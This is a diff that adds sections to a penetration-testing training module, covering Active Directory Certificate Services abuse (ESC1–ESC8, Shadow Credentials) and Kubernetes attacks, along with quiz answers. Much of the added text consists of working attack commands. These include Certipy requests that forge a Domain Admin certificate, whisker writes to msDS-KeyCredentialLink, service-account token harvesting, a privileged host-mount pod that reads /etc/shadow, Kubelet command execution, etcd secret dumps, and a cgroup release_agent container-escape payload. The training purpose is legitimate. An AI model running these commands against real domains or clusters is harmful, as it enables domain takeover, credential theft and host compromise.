@@ -12,6 +12,8 @@ By completing this module, network penetration testers, infrastructure security 
 4. **Architect Multi-Hop Encrypted Pivots**: Deploy modern SOCKS5 and Layer-3 virtual TUN pivot tunnels using Chisel, Ligolo-ng, and SSH dynamic forwarding to traverse internal firewall boundaries.
 5. **Audit Endpoint Privilege Escalation Primitives**: Systematically uncover local privilege elevation vectors across Windows (CWE-428 Unquoted Service Paths, Token Impersonation) and Linux (dangerous SUID binaries, sudoer wildcard abuse).
 6. **Validate Network Segmentation Resilience**: Formulate non-destructive proof-of-concept tests verifying whether internal VLAN access control lists (ACLs) prevent lateral movement.
+7. **Exploit Active Directory Certificate Services (ADCS)**: Detect and exploit vulnerable certificate templates (ESC1–ESC8) and Shadow Credentials (`msDS-KeyCredentialLink`) to forge administrative credentials using Certipy and PKINIT.
+8. **Assess Kubernetes Clusters & Break Out of Containers**: Harvest in-pod ServiceAccount tokens, audit RBAC rights, exploit unauthenticated Kubelets/etcd, and execute host escapes via privileged containers and cgroup release agents.
 
 ---
 
@@ -222,6 +224,71 @@ Traditional Active Directory audits struggled with multi-hop permission chains. 
 
 ---
 
+#### 5.3.5 Active Directory Certificate Services (ADCS) Exploitation: ESC1–ESC8 & Shadow Credentials
+
+Active Directory Certificate Services (ADCS) is Microsoft's PKI implementation that automatically issues and manages X.509 digital certificates for users, computers, and services across a Windows domain. Certificates are frequently used for **Kerberos Pre-Authentication (PKINIT)**, allowing users to obtain a Kerberos Ticket Granting Ticket (TGT) using their certificate private key instead of a password.
+
+```
+[ Domain User / Attacker ] ──(1. Requests Certificate with forged SAN)──> [ ADCS Certification Authority (CA) ]
+                                                                                   │
+                                                                                   ▼ (2. Issues X.509 Certificate)
+[ Attacker: admin.pfx ] <──────────────────────────────────────────────────────────┘
+       │
+       ▼ (3. Kerberos PKINIT Authentication via Port 88)
+[ Domain Controller / KDC ] ──(4. Validates Cert & Issues Domain Admin TGT + NT Hash)──> [ Full Domain Compromise ]
+```
+
+##### 1. The Anatomy of Vulnerable Certificate Templates
+A **Certificate Template** defines the enrollment rules, security descriptors, and cryptographic parameters for issued certificates. A template becomes exploitable for full domain privilege escalation when it satisfies three conditions:
+1. **Client Authentication EKU**: The template specifies an Extended Key Usage (EKU) permitting Kerberos/Schannel client authentication (e.g., `Client Authentication` `1.3.6.1.5.5.7.3.2`, `Smart Card Logon` `1.3.6.1.4.1.311.20.2.2`, or `Any Purpose` `2.5.29.37.0`).
+2. **Enrollee Supplies Subject Alternative Name (SAN)**: The template flag `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` (`msPKI-Certificate-Name-Flag` contains `0x00000001` / `ENROLLEE_SUPPLIES_SAN`) is set, allowing the requesting user to specify *any* arbitrary identity in the certificate's SAN attribute!
+3. **Overly Permissive Enrollment Permissions**: Standard domain users (e.g., `Domain Users` or `Authenticated Users`) possess `Enroll` or `AutoEnroll` rights in the template's Discretionary Access Control List (DACL).
+
+##### 2. The ESC (Certified Pre-Owned) Vulnerability Taxonomy
+
+| Vulnerability Vector | Technical Flaw / Root Cause | Auditor Verification & Exploitation Impact |
+| :--- | :--- | :--- |
+| **ESC1** | Client Authentication EKU + `ENROLLEE_SUPPLIES_SAN` flag enabled + low-privilege enroll rights. | **Immediate Domain Admin**: Attacker requests certificate specifying `SAN=administrator@corp.local` and authenticates via PKINIT to receive a Domain Admin TGT. |
+| **ESC2** | Template defines `Any Purpose` EKU (`2.5.29.37.0`) or has no EKU defined. | Can be used for any purpose, including client authentication or signing subordinate certificate requests. |
+| **ESC3** | Template specifies `Certificate Request Agent` EKU (`1.3.6.1.4.1.311.20.2.1`). | Allows the holder to act as an enrollment agent, cryptographically co-signing certificate requests on behalf of arbitrary domain principals. |
+| **ESC4** | Low-privilege account possesses `WriteDacl`, `WriteOwner`, or `GenericWrite` permissions over a Certificate Template object in Active Directory. | Attacker modifies the template DACL or reconfigures its flags into an **ESC1** configuration, requests an admin certificate, and restores the original template. |
+| **ESC6** | The Certification Authority (CA) itself has the flag `EDITF_ATTRIBUTESUBJECTALTNAME2` enabled in registry. | **Universal ESC1**: The CA permits enrollees to supply SANs on **every** template, even if the template explicitly prohibits it! |
+| **ESC8** | ADCS Web Enrollment HTTP endpoints (`http://<CA>/certsrv/`) do not enforce Extended Protection for Authentication (EPA) and run over plaintext HTTP. | **NTLM Relay to ADCS**: Attacker coerces machine account authentication (via PetitPotam / PrinterBug) and relays NetNTLM to the CA web service to obtain a machine certificate for a Domain Controller. |
+
+##### 3. Practical Auditing & Exploitation with Certipy
+
+```bash
+# 1. Enumerate vulnerable ADCS templates and CAs across the domain
+certipy find -u alice@corp.local -p 'Password123!' -dc-ip 10.10.20.10 -vulnerable -stdout
+
+# 2. Exploit ESC1: Request a certificate on behalf of the Domain Administrator
+certipy req -u alice@corp.local -p 'Password123!' -ca CORP-CA \
+  -template ESC1Template -upn administrator@corp.local -dc-ip 10.10.20.10 -out admin.pfx
+
+# 3. Authenticate via Kerberos PKINIT to retrieve Domain Admin TGT and NT Hash
+certipy auth -pfx admin.pfx -dc-ip 10.10.20.10
+# Output:
+#   [*] Got TGT for 'administrator@corp.local'
+#   [*] Saving credential cache to 'administrator.ccache'
+#   [*] Got NT hash: 31d6cfe0d16ae931b73c59d7e0c089c0
+
+# 4. Use the recovered NT hash to execute administrative commands via NetExec / WMI
+netexec smb 10.10.20.10 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 -x "whoami"
+```
+
+##### 4. Shadow Credentials (`msDS-KeyCredentialLink` Abuse)
+* **Root Cause**: Windows Server 2016+ introduced Windows Hello for Business and Kerberos PKINIT authentication using an LDAP attribute on user and computer objects called `msDS-KeyCredentialLink`.
+* **Exploitation Path**: If an attacker compromises an account with `GenericWrite` or `WriteProperty` rights over a target user or computer, but cannot reset the password (e.g., due to monitoring or high-privilege password protection):
+  1. The attacker generates a self-signed X.509 certificate and private key.
+  2. The attacker writes the certificate public key data directly to the victim's `msDS-KeyCredentialLink` attribute using tools like `whisker.py` or `pywhiskey`:
+     ```bash
+     python3 whisker.py add -target "target_dc$" -domain corp.local -u alice -p 'Password123!'
+     ```
+  3. The attacker immediately authenticates as the victim computer/user via Kerberos PKINIT using the generated certificate, extracting the account's NTLM hash and a valid TGT without alerting the victim!
+* **Remediation**: Audit ACLs on `msDS-KeyCredentialLink` attribute writes; alert on unexpected modifications to computer object attributes using Windows Event ID 5136.
+
+---
+
 ### 5.4 Linux & Windows Local Privilege Escalation (PrivEsc) Master Framework
 
 Obtaining an initial remote shell grants access as a low-privileged system user (e.g., `www-data` on Linux or `IIS_IUSRS` / standard domain user on Windows). The objective of local privilege escalation is elevating access to administrative control (`root` on Linux, `NT AUTHORITY\SYSTEM` on Windows).
@@ -341,6 +408,177 @@ As enterprise workloads migrate to public cloud providers, modern penetration te
 * **Entra ID vs. Traditional Active Directory**: Entra ID is a cloud-based identity provider operating over REST APIs (Microsoft Graph) using OAuth 2.0, OpenID Connect, and SAML—it does not use Kerberos, NTLM, or LDAP.
 * **Service Principals & Managed Identities**: Applications hosted in Azure (e.g., App Services, Virtual Machines) use Managed Identities to obtain Azure Resource Manager (ARM) tokens without hardcoding credentials in configuration files.
 * **Azure Key Vault Auditing**: Auditors evaluate Key Vault access policies to verify whether unprivileged application identities can retrieve secrets, connection strings, or administrative signing certificates.
+
+---
+
+### 5.6 Kubernetes (K8s) Cluster Pentesting & Cloud Container Breakouts
+
+Kubernetes is the de facto orchestration engine for containerized applications in cloud environments. Understanding how to assess a cluster from an initially compromised pod to full node or control plane compromise is critical for modern cloud penetration testing.
+
+```mermaid
+graph TD
+    subgraph "Control Plane (Master Node)"
+        APISERVER["API Server (Port 6443)<br/>(REST Endpoint, RBAC Enforcement)"]
+        ETCD["etcd Key-Value Store (Port 2379)<br/>(Encrypted Cluster State & Secrets)"]
+        CONTROLLER["Kube Controller Manager"]
+        SCHED["Kube Scheduler"]
+    end
+
+    subgraph "Worker Node (Kubelet Port 10250)"
+        KUBELET["Kubelet Agent (:10250)"]
+        PROXY["Kube-Proxy (Networking)"]
+        
+        subgraph "Compromised Pod Environment"
+            POD["Compromised Application Container"]
+            SA["ServiceAccount Token<br/>/var/run/secrets/kubernetes.io/serviceaccount/token"]
+        end
+    end
+
+    POD -->|"1. Harvest Token"| SA
+    POD -->|"2. Query RBAC & Secrets"| APISERVER
+    POD -->|"3. Unauth Command Injection (:10250)"| KUBELET
+    APISERVER <--> ETCD
+```
+
+#### 5.6.1 Container Discovery & ServiceAccount Token Extraction
+
+When an auditor lands a remote shell in an unknown Linux environment, the first step is detecting whether the process is trapped inside a container:
+1. **Container Indicators**:
+   - Check process 1 cgroup: `grep -i -E "docker|kubepods|containerd" /proc/1/cgroup`
+   - Check file indicators: `ls -la /.dockerenv`
+   - Check environment variables: `env | grep -i KUBERNETES` (e.g., `KUBERNETES_SERVICE_HOST`, `KUBERNETES_PORT_443_TCP_PORT`).
+2. **In-Pod ServiceAccount Token Harvesting**:
+   By default, Kubernetes mounts a service account JWT token inside every running pod:
+   ```bash
+   SA_PATH="/var/run/secrets/kubernetes.io/serviceaccount"
+   ls -la $SA_PATH
+   # Contains: ca.crt, namespace, token
+   
+   TOKEN=$(cat $SA_PATH/token)
+   NAMESPACE=$(cat $SA_PATH/namespace)
+   ```
+3. **Querying the Kubernetes API Server**:
+   ```bash
+   APISERVER="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}"
+   
+   # Query API Server using harvested ServiceAccount JWT
+   curl -s --cacert $SA_PATH/ca.crt \
+        -H "Authorization: Bearer $TOKEN" \
+        "$APISERVER/api/v1/namespaces/$NAMESPACE/pods"
+   ```
+
+#### 5.6.2 Kubernetes RBAC Privilege Escalation
+
+Once the token is acquired, evaluate what actions the service account is authorized to perform:
+```bash
+# Check all permissions granted to current token
+kubectl auth can-i --list --token="$TOKEN" --server="$APISERVER" --certificate-authority="$SA_PATH/ca.crt"
+```
+
+##### Critical Dangerous RBAC Permissions:
+1. **`create pods` or `create deployments`**:
+   An attacker creates a malicious pod definition mounting the underlying host's root filesystem (`/`) to escape the container:
+   ```yaml
+   apiVersion: v1
+   kind: Pod
+   metadata:
+     name: node-escape-pod
+     namespace: default
+   spec:
+     containers:
+     - name: escape-container
+       image: alpine:latest
+       command: ["/bin/sh", "-c", "chroot /host /bin/sh -c 'id; cat /etc/shadow'"]
+       securityContext:
+         privileged: true
+       volumeMounts:
+       - mountPath: /host
+         name: host-root
+     volumes:
+     - name: host-root
+       hostPath:
+         path: /
+   ```
+2. **`pods/exec`**: Allows spawning an interactive shell inside any other pod running on the cluster (including `kube-system` control pods).
+3. **`get secrets` or `list secrets`**: Allows dumping all cluster secrets, API tokens, database credentials, and cloud access keys:
+   ```bash
+   curl -s --cacert $SA_PATH/ca.crt -H "Authorization: Bearer $TOKEN" \
+        "$APISERVER/api/v1/namespaces/kube-system/secrets" | jq .
+   ```
+
+#### 5.6.3 Unauthenticated Kubelet (10250) & etcd (2379) Exploitation
+
+1. **Kubelet API Port 10250 Exploitation**:
+   - If the node's Kubelet has `--anonymous-auth=true` enabled (or an attacker possesses a token with node permissions), the auditor can execute arbitrary commands in any pod managed by that node:
+   ```bash
+   # List all pods running on the node
+   curl -k https://<NODE_IP>:10250/pods
+   
+   # Execute command directly inside a running container via Kubelet
+   curl -k -X POST "https://<NODE_IP>:10250/run/<NAMESPACE>/<POD_NAME>/<CONTAINER_NAME>" \
+        -d "cmd=id"
+   ```
+2. **Unauthenticated etcd Port 2379 Exploitation**:
+   - `etcd` stores the complete state and configuration of the Kubernetes cluster. If port 2379 is reachable without client TLS certificate authentication:
+   ```bash
+   # Dump all cluster keys and secrets stored in etcd
+   etcdctl --endpoints=https://<MASTER_IP>:2379 get "" --prefix --keys-only
+   
+   # Extract all service account tokens across the cluster
+   etcdctl --endpoints=https://<MASTER_IP>:2379 get /registry/secrets/kube-system/ --prefix
+   ```
+
+#### 5.6.4 Container Breakout Vectors to Host Node Root
+
+```
+[ Compromised Container Shell ]
+               │
+   ┌───────────┼───────────────────────────┐
+   ▼                           ▼                           ▼
+[ Vector 1: Privileged ]   [ Vector 2: Docker Socket ]   [ Vector 3: CAP_SYS_ADMIN ]
+Mount host block device     Sibling container with -v /   cgroups v1 release_agent
+`mount /dev/sda1 /mnt`      `docker run -v /:/host`       kernel notification trigger
+   │                           │                           │
+   └───────────────────────────┼───────────────────────────┘
+                               ▼
+               [ Root Shell on Underlying Host Node ]
+```
+
+1. **Breakout Vector 1: Privileged Container (`--privileged`)**:
+   - A privileged container has access to all host devices in `/dev`.
+   - The attacker discovers the host root drive with `fdisk -l` or `lsblk` and mounts it:
+     ```bash
+     mkdir -p /mnt/host
+     mount /dev/sda1 /mnt/host
+     chroot /mnt/host /bin/sh
+     # Auditor now possesses interactive root access on the physical host!
+     ```
+2. **Breakout Vector 2: Mounted Docker Daemon Socket (`/var/run/docker.sock`)**:
+   - If the container shares the host's Docker socket, the container can communicate directly with the host's Docker daemon:
+     ```bash
+     # Launch a sibling container that mounts the host root directory
+     docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host /bin/sh
+     ```
+3. **Breakout Vector 3: `CAP_SYS_ADMIN` & cgroup v1 `release_agent` Breakout**:
+   - If a container runs with `CAP_SYS_ADMIN` and apparmor is disabled, the auditor can abuse the cgroup `release_agent` mechanism to execute arbitrary commands as host `root`:
+     ```bash
+     # 1. Mount memory cgroup controller
+     mkdir -p /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp
+     mkdir -p /tmp/cgrp/x
+     echo 1 > /tmp/cgrp/x/notify_on_release
+     
+     # 2. Configure release_agent script on host filesystem
+     HOST_PATH=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
+     echo "$HOST_PATH/cmd.sh" > /tmp/cgrp/release_agent
+     
+     # 3. Write command payload
+     echo '#!/bin/sh' > /cmd.sh
+     echo 'cat /etc/shadow > /cmd_output' >> /cmd.sh
+     chmod +x /cmd.sh
+     
+     # 4. Trigger release agent by emptying the cgroup process list
+     sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
+     ```
 
 ---
 
@@ -647,6 +885,10 @@ In Windows System Properties -> Remote Desktop:
    * *Answer*:
      * *Method 1 (SOCKS5 Proxy via Chisel)*: Deploy the Chisel client on the Linux DMZ host connecting back to your assessor Kali machine (`chisel server --reverse`). Forward a dynamic SOCKS5 proxy on `127.0.0.1:1080`. Configure `/etc/proxychains4.conf` to route traffic through `socks5 127.0.0.1 1080`. Run `proxychains4 nmap -sT -Pn -p 3306,5432,1433,1521 10.10.20.15`. (Must use `-sT` since SOCKS cannot proxy raw SYN packets).
      * *Method 2 (Layer-3 TUN Pivot via Ligolo-ng)*: Start the Ligolo-ng proxy on Kali. Run the Ligolo-ng agent on the Linux DMZ host. Establish a reverse session. On Kali, create a virtual TUN interface and add a kernel route: `sudo ip route add 10.10.20.0/24 dev ligolo`. Run `nmap -sS -p 3306,5432,1433,1521 10.10.20.15` directly from your command line without proxychains.
+5. **Question**: Explain how an Active Directory Certificate Services (ADCS) ESC1 misconfiguration allows a standard domain user to escalate directly to Domain Administrator.
+   * *Answer*: ESC1 occurs when a certificate template has `Client Authentication` EKU, permits standard users to enroll, and has the flag `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` enabled. An attacker requests a certificate from the CA specifying the Subject Alternative Name (SAN) of `administrator@corp.local`. The CA issues an X.509 certificate for the Domain Administrator. The attacker then authenticates via Kerberos PKINIT (e.g., using `certipy auth`), presenting the certificate private key to the KDC, which returns a valid Domain Admin TGT and NTLM hash.
+6. **Question**: If an auditor obtains shell access inside a Kubernetes container, how do they determine their cluster privileges and attempt a container breakout to the host?
+   * *Answer*: First, the auditor extracts the mounted ServiceAccount token from `/var/run/secrets/kubernetes.io/serviceaccount/token`. Using `kubectl auth can-i --list --token=$TOKEN`, they check RBAC verbs. If `create pods` is permitted, they deploy a privileged pod that mounts the host root directory (`hostPath: /`). If already in a privileged container (`--privileged`), they mount the host block device directly (`mount /dev/sda1 /mnt && chroot /mnt /bin/bash`). If `/var/run/docker.sock` is mounted, they use the Docker binary/API to spawn a sibling container with host root mounted.
 
 ---
 
